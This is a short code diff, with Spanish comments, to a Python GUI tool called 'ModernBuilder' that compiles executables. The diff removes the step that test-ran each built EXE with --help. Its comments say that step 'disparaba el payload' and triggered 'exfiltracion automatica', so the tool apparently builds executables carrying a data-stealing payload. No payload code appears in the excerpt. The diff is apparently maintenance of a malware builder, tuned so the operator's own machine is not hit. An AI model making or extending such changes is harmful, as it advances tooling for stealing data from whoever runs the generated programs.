@@ -377,13 +377,7 @@ class ModernBuilder:
             except:
                 pass
 
-            try:
-                test = subprocess.run([dest, '--help'], capture_output=True, timeout=5)
-                if test.returncode not in (0, 1, 2):
-                    pass
-            except:
-                pass
-
+            # NO auto-ejecutar el EXE - solo generar. Antes se ejecutaba con --help y disparaba el payload (fix: eliminado).
             return True, dest
 
         err = (result.stderr or "") + "\n" + (result.stdout or "")
@@ -441,13 +435,7 @@ class ModernBuilder:
             self.root.after(0, lambda: self.status_var.set("Compilando... (puede tardar 1-2 min)"))
             success, result = self.compile_executable()
             if success:
-                if not self.console_mode.get():
-                    try:
-                        fallback_test = subprocess.run([result, '--help'], capture_output=True, timeout=5)
-                    except Exception as e:
-                        if "ordinal" in str(e).lower() or "380" in str(e):
-                            self.root.after(0, self.build_failed, self.get_ordinal_fix_message())
-                            return
+                # NO validar ejecutando el EXE - eso disparaba exfiltracion automatica. Solo notificar exito.
                 self.root.after(0, self.build_success, result)
             else:
                 if "ordinal" in result.lower() or "380" in result:
